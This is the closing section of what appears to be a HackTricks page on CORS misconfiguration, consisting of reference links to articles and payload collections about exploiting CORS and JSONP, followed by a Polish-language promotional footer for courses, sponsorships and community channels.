* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF** sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub **grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
